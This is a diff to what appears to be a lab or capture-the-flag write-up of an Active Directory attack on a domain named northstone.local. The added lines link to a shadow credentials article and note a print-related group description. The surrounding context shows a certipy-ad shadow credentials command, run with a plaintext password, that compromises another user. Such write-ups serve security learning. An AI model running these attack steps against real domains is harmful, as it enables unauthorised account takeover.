@@ -1106,6 +1106,8 @@ So ill try a shadow creds attack
 
 ## Shadow Credentials
 
+https://www.hackingarticles.in/shadow-credentials-attack/
+
 ```python
 certipy-ad shadow auto -u r.parker@northstone.local -p 'Password123!' -account 'l.turner' 
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -1143,3 +1145,10 @@ SMB         10.1.209.181    445    DC               [+] northstone.local\l.turne
 
 This user is now compromised!
 
+Now checking the group print service operators i see a description:
+
+```python
+Description:
+
+Members of this group are responsible for managing printer-related operations. This includes access to printer service files, directories, and scheduled tasks used for maintenance and monitoring
+```
